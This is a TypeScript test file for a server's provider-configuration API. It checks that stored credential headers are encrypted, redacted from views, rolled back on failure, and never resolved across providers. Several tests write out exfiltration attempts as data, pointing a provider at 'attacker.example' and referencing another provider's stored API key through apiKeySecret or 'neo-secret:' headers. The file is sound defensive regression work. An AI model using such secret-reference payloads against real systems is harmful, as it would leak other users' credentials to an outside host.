import { mkdtempSync, rmSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { afterEach, describe, expect, it, vi } from 'vitest';
import { NeoConfigSchema, NeoError, silentLogger, type ProviderView } from '@neo/protocol';
import { OWNER_TOKEN, routeFixture } from './route-fixture.test-utils.js';
import { createApp } from './app.js';
import { createServices } from './services.js';
import type { NeoServices } from './index.js';

let fixture: ReturnType<typeof routeFixture>;
const resources: NeoServices[] = [];
const directories: string[] = [];
afterEach(async () => {
  await fixture?.services.close();
  fixture = undefined!;
  for (const service of resources.splice(0)) await service.close();
  for (const directory of directories.splice(0)) rmSync(directory, { recursive: true, force: true });
  vi.unstubAllGlobals();
});

async function liveProviderFixture() {
  const fetch = vi.fn<typeof globalThis.fetch>(async () => Response.json({ data: [{ id: 'fixture-model' }] }));
  vi.stubGlobal('fetch', fetch);
  const services = await createServices(NeoConfigSchema.parse({
    providers: [{ id: 'configured', kind: 'mock', headers: { 'x-api-key': 'protected-fixture-credential' } }],
    plugins: { enabled: false }, log: { level: 'silent' },
  }), { inMemory: true, logger: silentLogger });
  resources.push(services);
  const { token } = services.devices.create({ name: 'paired attacker', platform: 'web' });
  const { app } = createApp(services);
  const request = (path: string, method = 'POST', body?: unknown) => app.request(path, {
    method, headers: { Authorization: `Bearer ${token}`, 'Content-Type': 'application/json' },
    ...(body === undefined ? {} : { body: JSON.stringify(body) }),
  });
  const sent = () => fetch.mock.calls.map(([url, init]) => ({
    url: String(url), headers: Object.fromEntries(new Headers(init?.headers)), body: init?.body,
  }));
  expect(services.secrets.get('provider:configured:header:x-api-key')).toBe('protected-fixture-credential');
  return { services, request, fetch, sent };
}

describe('provider credential header security', () => {
  it.each(['POST', 'PATCH'])('blocks the original %s secret-reference attack through the live provider test route', async (method) => {
    const live = await liveProviderFixture();
    const attack = { kind: 'openai', baseUrl: 'https://attacker.example/v1', apiKeySecret: 'provider:configured:header:x-api-key' };
    if (method === 'PATCH') {
      expect((await live.request('/api/providers', 'POST', { id: 'attack', kind: 'openai', baseUrl: 'https://attacker.example/v1' })).status).toBe(201);
    }
    const response = await live.request(method === 'POST' ? '/api/providers' : '/api/providers/attack', method, { id: 'attack', ...attack });
    expect(response.status).toBe(method === 'POST' ? 201 : 200);
    const tested = await live.request('/api/providers/attack/test');
    expect(tested.status).toBe(200);
    expect(live.services.providerConfigs.get('attack')?.apiKeySecret).toBeUndefined();
    expect(await tested.json()).toMatchObject({ ok: false });
    expect(live.fetch).not.toHaveBeenCalled();
    expect(JSON.stringify(live.sent())).not.toContain('protected-fixture-credential');
    expect(live.services.secrets.get('provider:configured:header:x-api-key')).toBe('protected-fixture-credential');
  });

  it.each(['POST', 'PATCH', 'draft'])('never dereferences a cross-provider header in a %s adapter', async (method) => {
    const live = await liveProviderFixture();
    const attack = {
      kind: 'openai', baseUrl: 'https://attacker.example/v1', apiKey: 'attacker-owned-key',
      apiKeySecret: 'provider:configured:header:x-api-key',
      headers: { 'x-api-key': 'neo-secret:provider:configured:header:x-api-key' },
    };
    if (method === 'draft') {
      const tested = await live.request('/api/providers/test', 'POST', attack);
      expect(tested.status).toBe(200);
      expect(await tested.json()).toMatchObject({ ok: true });
    } else {
      if (method === 'PATCH') expect((await live.request('/api/providers', 'POST', { id: 'attack', kind: 'openai' })).status).toBe(201);
      const changed = await live.request(method === 'POST' ? '/api/providers' : '/api/providers/attack', method, { id: 'attack', ...attack });
      expect(changed.status).toBe(method === 'POST' ? 201 : 200);
      expect(await (await live.request('/api/providers/attack/test')).json()).toMatchObject({ ok: true });
    }
    expect(live.sent()).toEqual([{
      url: 'https://attacker.example/v1/models',
      headers: { authorization: 'Bearer attacker-owned-key', 'x-api-key': 'neo-secret:provider:configured:header:x-api-key' },
      body: undefined,
    }]);
    expect(JSON.stringify(live.sent())).not.toContain('protected-fixture-credential');
    expect(live.services.secrets.get('provider:configured:header:x-api-key')).toBe('protected-fixture-credential');
  });

  it('ignores secret references in draft tests without granting access to the secret store', async () => {
    const live = await liveProviderFixture();
    const response = await live.request('/api/providers/test', 'POST', {
      kind: 'openai', baseUrl: 'https://attacker.example/v1', apiKeySecret: 'provider:configured:header:x-api-key',
    });
    expect(await response.json()).toMatchObject({ ok: false });
    expect(live.fetch).not.toHaveBeenCalled();
  });

  it('creates and replaces inline API keys used by real adapters', async () => {
    const live = await liveProviderFixture();
    expect((await live.request('/api/providers', 'POST', { id: 'owned', kind: 'openai', baseUrl: 'https://owned.example/v1', apiKey: 'first-inline-key' })).status).toBe(201);
    expect(live.services.providerConfigs.get('owned')?.apiKeySecret).toBe('provider:owned');
    expect(await (await live.request('/api/providers/owned/test')).json()).toMatchObject({ ok: true });
    expect((await live.request('/api/providers/owned', 'PATCH', { apiKey: 'replacement-inline-key' })).status).toBe(200);
    expect(await (await live.request('/api/providers/owned/test')).json()).toMatchObject({ ok: true });
    expect(live.sent().map(({ headers }) => headers['authorization'])).toEqual(['Bearer first-inline-key', 'Bearer replacement-inline-key']);
    const listed = await live.request('/api/providers', 'GET');
    expect(await listed.text()).not.toMatch(/first-inline-key|replacement-inline-key|apiKeySecret/);
  });

  it('encrypts all credential header names, redacts API views, and resolves live adapter headers', async () => {
    fixture = routeFixture();
    const headers = {
      Authorization: 'Bearer bearer-secret', 'x-api-key': 'api-secret',
      'x-goog-api-key': 'google-secret', 'api-key': 'legacy-secret',
      'X-Session-Token': 'session-secret', 'X-Custom-Secret': 'custom-credential',
      'X-Region': 'test-region',
    };
    const created = await fixture.request('/api/providers', 'POST', { id: 'custom', kind: 'mock', headers });
    expect(created.status).toBe(201);
    const view = await created.json() as ProviderView;
    expect(view.headers).toEqual(Object.fromEntries(Object.keys(headers).map((name) => [name, name === 'X-Region' ? 'test-region' : '••••'])));
    const stored = fixture.services.providerConfigs.get('custom')!;
    expect(stored.headers?.['x-goog-api-key']).toBe('neo-secret:provider:custom:header:x-goog-api-key');
    const raw = fixture.services.db!.prepare('SELECT config FROM provider_configs').get() as { config: string };
    expect(raw.config).not.toMatch(/bearer-secret|api-secret|google-secret|legacy-secret|session-secret|custom-credential/);
    expect(fixture.services.providers.get('custom')?.config.headers).toEqual(headers);
    expect(await (await fixture.request('/api/providers')).text()).not.toMatch(/bearer-secret|api-secret|google-secret|legacy-secret|session-secret|custom-credential/);
    const patched = await fixture.request('/api/providers/custom', 'PATCH', { label: 'renamed' });
    expect(patched.status).toBe(200);
    expect(fixture.services.providers.get('custom')?.config.headers).toEqual(headers);
    expect((await fixture.request('/api/providers/custom', 'DELETE')).status).toBe(204);
    expect(fixture.services.secrets.list()).toEqual([]);
  });

  it('redacts credential headers loaded directly from the config file', async () => {
    fixture = routeFixture({ providers: [{ id: 'configured', kind: 'mock', headers: { 'x-goog-api-key': 'config-google-secret', 'X-Private-Auth': 'config-auth-secret', 'X-Region': 'test' } }] });
    const response = await fixture.request('/api/providers');
    expect(response.status).toBe(200);
    const body = await response.json() as { items: ProviderView[] };
    expect(body.items[0]?.headers).toEqual({ 'x-goog-api-key': '••••', 'X-Private-Auth': '••••', 'X-Region': 'test' });
    expect(JSON.stringify(body)).not.toMatch(/config-google-secret|config-auth-secret/);
  });

  it('rolls back encrypted headers and the adapter on failed provider changes', async () => {
    fixture = routeFixture();
    expect((await fixture.request('/api/providers', 'POST', { id: 'custom', kind: 'mock', headers: { 'x-goog-api-key': 'original-secret' } })).status).toBe(201);
    vi.mocked(fixture.services.providers.upsert).mockImplementationOnce(() => { throw new NeoError('config_error', 'Adapter rejected'); });
    const result = await fixture.request('/api/providers/custom', 'PATCH', { headers: { 'x-goog-api-key': 'replacement-secret' } });
    expect(result.status).toBe(500);
    expect(fixture.services.secrets.get('provider:custom:header:x-goog-api-key')).toBe('original-secret');
    expect(fixture.services.providers.get('custom')?.config.headers?.['x-goog-api-key']).toBe('original-secret');
    const raw = fixture.services.db!.prepare('SELECT config FROM provider_configs').get() as { config: string };
    expect(raw.config).not.toMatch(/original-secret|replacement-secret/);
  });

  it('restores a replaced live adapter when persisting its encrypted config fails', async () => {
    fixture = routeFixture();
    expect((await fixture.request('/api/providers', 'POST', { id: 'custom', kind: 'mock', headers: { 'x-api-key': 'original-key' } })).status).toBe(201);
    vi.spyOn(fixture.services.providerConfigs, 'upsert').mockImplementationOnce(() => { throw new NeoError('config_error', 'Persistence rejected'); });
    const response = await fixture.request('/api/providers/custom', 'PATCH', { headers: { 'x-api-key': 'replacement-key' } });
    expect(response.status).toBe(500);
    expect(fixture.services.providers.get('custom')?.config.headers?.['x-api-key']).toBe('original-key');
    expect(fixture.services.secrets.get('provider:custom:header:x-api-key')).toBe('original-key');
  });

  it('strips apiKeySecret from POST body so a client cannot point it at another providers secret', async () => {
    fixture = routeFixture();
    // Seed a secret belonging to another provider.
    fixture.services.secrets.set('provider:other', 'stolen-api-key');
    // Try to create a provider whose apiKeySecret points at the other provider's secret.
    const response = await fixture.request('/api/providers', 'POST', {
      id: 'attack', kind: 'mock', apiKeySecret: 'provider:other',
    }, OWNER_TOKEN);
    // The request is accepted (no crash), but the cross-provider reference was stripped.
    expect(response.status).toBe(201);
    const saved = fixture.services.providerConfigs.get('attack');
    // apiKeySecret must not reference another provider's key — it must be absent.
    expect(saved?.apiKeySecret).toBeUndefined();
    // The victim provider's secret must be untouched.
    expect(fixture.services.secrets.get('provider:other')).toBe('stolen-api-key');
  });

  it('strips apiKeySecret from PATCH body so credentials cannot be redirected', async () => {
    fixture = routeFixture();
    await fixture.request('/api/providers', 'POST', { id: 'victim', kind: 'mock' });
    fixture.services.secrets.set('provider:attacker', 'attacker-api-key');
    const response = await fixture.request('/api/providers/victim', 'PATCH', {
      apiKeySecret: 'provider:attacker',
    });
    expect(response.status).toBe(200);
    const saved = fixture.services.providerConfigs.get('victim');
    // The patch must not have implanted a foreign secret reference.
    expect(saved?.apiKeySecret).toBeUndefined();
    expect(fixture.services.secrets.get('provider:attacker')).toBe('attacker-api-key');
  });

  it('defense-in-depth: save() rejects an apiKeySecret scoped to a different provider', async () => {
    // This guards against any future route that bypasses the Zod schema stripping.
    // We achieve this by manually creating a provider whose config has an out-of-scope
    // apiKeySecret and then calling PATCH (which calls save()) to trigger the check.
    fixture = routeFixture();
    // First create the provider legitimately.
    await fixture.request('/api/providers', 'POST', { id: 'custom', kind: 'mock' });
    // Manually corrupt the stored config to simulate a direct DB write or a future route bug.
    const existing = fixture.services.providerConfigs.get('custom')!;
    fixture.services.providerConfigs.upsert({ ...existing, apiKeySecret: 'provider:other-provider' });
    // A subsequent save() via PATCH must now reject the out-of-scope reference.
    const result = await fixture.request('/api/providers/custom', 'PATCH', { label: 'renamed' });
    expect(result.status).toBe(400);
    const body = await result.json() as { code: string };
    expect(body.code).toBe('bad_request');
  });

  it('never resolves user-supplied header references to another provider secret', async () => {
    fixture = routeFixture();
    fixture.services.secrets.set('provider:other:header:x-api-key', 'other-provider-secret');
    const attack = 'neo-secret:provider:other:header:x-api-key';
    const response = await fixture.request('/api/providers', 'POST', { id: 'custom', kind: 'mock', headers: { 'x-api-key': attack } }, OWNER_TOKEN);
    expect(response.status).toBe(201);
    expect(fixture.services.providers.get('custom')?.config.headers?.['x-api-key']).toBe(attack);
    expect(fixture.services.secrets.get('provider:custom:header:x-api-key')).toBe(attack);
  });

  it('rejects ambiguous duplicate credential headers with 400 and leaves stores unchanged', async () => {
    fixture = routeFixture();
    const response = await fixture.request('/api/providers', 'POST', {
      id: 'custom', kind: 'mock', headers: { Authorization: 'first-credential', authorization: 'second-credential' },
    });
    expect(response.status).toBe(400);
    expect(fixture.services.secrets.list()).toEqual([]);
    expect(fixture.services.providerConfigs.list()).toEqual([]);
    expect(fixture.services.providers.get('custom')).toBeUndefined();
  });

  it('resolves encrypted persisted credential headers into offline adapters after restart', async () => {
    const dataDir = mkdtempSync(join(tmpdir(), 'neo-provider-restart-'));
    directories.push(dataDir);
    const config = NeoConfigSchema.parse({ dataDir, providers: [], log: { level: 'silent' }, plugins: { enabled: false } });
    const first = await createServices(config, { logger: silentLogger });
    resources.push(first);
    const headers = { 'x-goog-api-key': 'persisted-google-credential', 'X-Region': 'test' };
    const response = await createApp(first).app.request('/api/providers', {
      method: 'POST', headers: { Authorization: `Bearer ${first.ownerToken}`, 'Content-Type': 'application/json' },
      body: JSON.stringify({ id: 'persisted', kind: 'mock', headers }),
    });
    expect(response.status).toBe(201);
    await first.close();
    const restarted = await createServices(config, { logger: silentLogger });
    resources.push(restarted);
    expect(restarted.providers.get('persisted')?.config.headers).toEqual(headers);
    expect(restarted.providerConfigs.get('persisted')?.headers?.['x-goog-api-key']).toBe('neo-secret:provider:persisted:header:x-goog-api-key');
    expect(restarted.secrets.get('provider:persisted:header:x-goog-api-key')).toBe('persisted-google-credential');
    const raw = restarted.db!.prepare('SELECT config FROM provider_configs').get() as { config: string };
    expect(raw.config).not.toContain('persisted-google-credential');
    const listed = await createApp(restarted).app.request('/api/providers', { headers: { Authorization: `Bearer ${restarted.ownerToken}` } });
    expect(await listed.text()).not.toContain('persisted-google-credential');
  });
});
